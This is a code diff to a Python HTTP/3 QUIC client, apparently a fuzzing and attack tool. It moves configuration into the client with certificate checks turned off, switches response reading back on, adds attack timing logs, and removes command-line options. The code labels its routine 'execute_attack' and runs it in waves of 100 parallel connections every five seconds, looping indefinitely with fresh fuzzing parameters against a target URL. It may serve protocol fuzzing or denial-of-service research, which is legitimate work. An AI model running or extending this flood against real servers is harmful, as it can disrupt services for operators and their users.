@@ -33,12 +33,18 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 sock.settimeout(0.1)
 
 class HttpClient():
-    def __init__(self, quic_conf: QuicConfiguration, fuzzing_conf: FuzzingConf, hostname: str) -> None:
+    def __init__(self, fuzzing_conf: FuzzingConf, hostname: str) -> None:
         
-        self.quic_conf = quic_conf
-        self.quic_conf.original_version = 1
+        self.quic_conf = QuicConfiguration(
+            is_client=True,
+            alpn_protocols=H3_ALPN,
+            original_version=1,
+            verify_mode=ssl.CERT_NONE,
+            server_name=hostname, # OLS requires. normally set in async module's connect()
+            #quic_logger=QuicFileLogger('quic_log'),
+            #secrets_log_file=open('secrets.keylog', "a")
+        )
         self.hostname = hostname
-        self.quic_conf.server_name = hostname # OLS requires. normally set in async module's connect()
         self.network_path = QuicNetworkPath(hostname)
         self._quic = QuicConnection(configuration=self.quic_conf)
         self._http = H3Connection(self._quic)
@@ -607,7 +613,7 @@ class HttpClient():
 
         crypto_pair = self._quic._cryptos[epoch]
         if not crypto_pair.send.is_valid():
-            print("The Encoding crypto is not valid to send data")
+            #print("The Encoding crypto is not valid to send data")
             return
         
         builder = self.get_builder(epoch)
@@ -748,10 +754,10 @@ class HttpClient():
         except socket.timeout: pass
 
 
-def execute_attack(configuration: QuicConfiguration, fuzzing_conf: FuzzingConf, url: str, once: bool):
+def execute_attack(fuzzing_conf: FuzzingConf, url: str, once: bool):
     try:
         # Step 1: Initialize the HTTP/3 client with QUIC configuration
-        h3client = HttpClient(configuration, fuzzing_conf, urlparse(url).netloc)
+        h3client = HttpClient(fuzzing_conf, urlparse(url).netloc)
 
         # Step 2: Establish the initial connection (handshake)
         if once: print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
@@ -765,19 +771,18 @@ def execute_attack(configuration: QuicConfiguration, fuzzing_conf: FuzzingConf, 
 
         if once: print("\033[93m\n[Opening Control Stream...]\033[0m")
         h3client.open_qpack_streams()
-        #h3client.read_from_buffer()
+        h3client.read_from_buffer()
 
         if once: print("\033[93m\n[Sending HEADERS frame...]\033[0m")
         headers_data = h3client.craft_sample_headers_frame()
         h3client.send_quic_stream(headers_data)
-        #h3client.read_from_buffer()
+        h3client.read_from_buffer()
     except Exception as e:
         if once: print(traceback.format_exc())
         else: pass #print(str(e))
 
 
 def main(
-    configuration: QuicConfiguration,
     url: str,
     once: bool,
     config_file: str = None # replicate fuzzing by reading values from a json file
@@ -785,7 +790,11 @@ def main(
 
     if once:
         fuzzing_conf = FuzzingConf(config_file)
-        execute_attack(configuration, fuzzing_conf, url, once)
+        attack_start_time = time.time()
+        attack_start_time_pretty = datetime.fromtimestamp(attack_start_time).strftime('%Y-%m-%d %H:%M:%S')
+        print("\n\033[31mNew Attack Starts at {}\033[0m".format(attack_start_time_pretty))
+        print(fuzzing_conf)
+        execute_attack(fuzzing_conf, url, once)
         sys.exit()
 
 
@@ -793,21 +802,23 @@ def main(
         with concurrent.futures.ThreadPoolExecutor() as executor:
             futures = []
             print("\033[31mStart running the attack for {} seconds with {} parallel connections and {} sec interval\033[0m".format(60, 100, 5))
-            
             while time.time() - attack_start_time < 61:                
                 for i in range(100):
                     # Submit each iteration as a separate task
-                    futures.append(executor.submit(execute_attack, configuration, fuzzing_conf, url, once))
+                    futures.append(executor.submit(execute_attack, fuzzing_conf, url, once))
                 time.sleep(5)
 
 
     while True: # new attack parameters at every iteration
-        fuzzing_conf = FuzzingConf(config_file)
         attack_start_time = time.time()
         attack_start_time_pretty = datetime.fromtimestamp(attack_start_time).strftime('%Y-%m-%d %H:%M:%S')
-        print("\033[31mNew Attack Starts at {}\033[0m".format(attack_start_time_pretty))
+        print("\n\033[31mNew Attack Starts at {}\033[0m".format(attack_start_time_pretty))
+        fuzzing_conf = FuzzingConf(config_file)
+        print(fuzzing_conf)
         run_attack()
-        print("\033[31mAttack Completes at {}\033[0m".format(attack_start_time_pretty))
+        attack_end_time = time.time()
+        attack_end_time_pretty = datetime.fromtimestamp(attack_end_time).strftime('%Y-%m-%d %H:%M:%S')
+        print("\033[31mAttack Completes at {}\033[0m".format(attack_end_time_pretty))
         time.sleep(60)
         
 
@@ -820,63 +831,7 @@ if __name__ == "__main__":
     parser.add_argument(
         "url", type=str, help="the URL to query (must be HTTPS)"
     )
-    parser.add_argument(
-        "--ca-certs", type=str, help="load CA certificates from the specified file"
-    )
-    parser.add_argument(
-        "--cipher-suites",
-        type=str,
-        help=(
-            "only advertise the given cipher suites, e.g. `AES_256_GCM_SHA384,"
-            "CHACHA20_POLY1305_SHA256`"
-        ),
-    )
-    parser.add_argument(
-        "--congestion-control-algorithm",
-        type=str,
-        default="reno",
-        help="use the specified congestion control algorithm",
-    )
-    parser.add_argument(
-        "--max-data",
-        type=int,
-        help="connection-wide flow control limit (default: %d)" % defaults.max_data,
-    )
-    parser.add_argument(
-        "--max-stream-data",
-        type=int,
-        help="per-stream flow control limit (default: %d)" % defaults.max_stream_data,
-    )
-    parser.add_argument(
-        "-q",
-        "--quic-log",
-        type=str,
-        help="log QUIC events to QLOG files in the specified directory",
-    )
-    parser.add_argument(
-        "-l",
-        "--secrets-log",
-        type=str,
-        help="log secrets to a file, for use with Wireshark",
-    )
-    parser.add_argument(
-        "-v", "--verbose", action="store_true", help="increase logging verbosity"
-    )
-    parser.add_argument(
-        "--local-port",
-        type=int,
-        default=0,
-        help="local port to bind for connections",
-    )
-    parser.add_argument(
-        "--max-datagram-size",
-        type=int,
-        default=defaults.max_datagram_size,
-        help="maximum datagram size to send, excluding UDP or IP overhead",
-    )
-    parser.add_argument(
-        "--zero-rtt", action="store_true", help="try to send requests using 0-RTT"
-    )
+
     parser.add_argument(
         "--once", action="store_true", help="Execute the attack once (for testing purposes)"
     )
@@ -889,33 +844,8 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    # prepare configuration
-    configuration = QuicConfiguration(
-        is_client=True,
-        alpn_protocols=H3_ALPN,
-        congestion_control_algorithm=args.congestion_control_algorithm,
-        max_datagram_size=args.max_datagram_size,
-        original_version=1
-    )
-    if args.ca_certs:
-        configuration.load_verify_locations(args.ca_certs)
-    if args.cipher_suites:
-        configuration.cipher_suites = [
-            CipherSuite[s] for s in args.cipher_suites.split(",")
-        ]
-    configuration.verify_mode = ssl.CERT_NONE
-    if args.max_data:
-        configuration.max_data = args.max_data
-    if args.max_stream_data:
-        configuration.max_stream_data = args.max_stream_data
-    if args.quic_log:
-        configuration.quic_logger = QuicFileLogger(args.quic_log)
-    if args.secrets_log:
-        configuration.secrets_log_file = open(args.secrets_log, "a")
-
     
     main(
-            configuration=configuration,
             url=args.url,
             once=args.once,
             config_file=args.config
